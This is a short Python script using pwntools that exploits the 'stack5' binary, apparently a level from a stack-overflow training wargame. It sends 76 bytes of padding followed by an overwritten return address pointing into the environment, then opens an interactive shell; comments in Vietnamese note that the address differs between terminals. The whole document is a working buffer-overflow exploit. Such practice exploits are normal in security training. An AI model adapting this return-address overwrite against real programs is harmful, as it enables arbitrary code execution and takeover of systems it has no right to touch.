from pwn import *

#Run stack5
s = process("./stack5")

#debug
raw_input()

padding = "A"*76

#moi~ terminal co' dia. chi~ env khac' nhau =]~
ret=0xffffd86e
#ret_of_gdb=0xffffdda0
#ret = 0xffffde9f

#payload = padding +p32(ret_of_gdb)
payload = padding + p32(ret)

#Send payload
s.sendline(payload)

#giao tiep' shell
s.interactive()

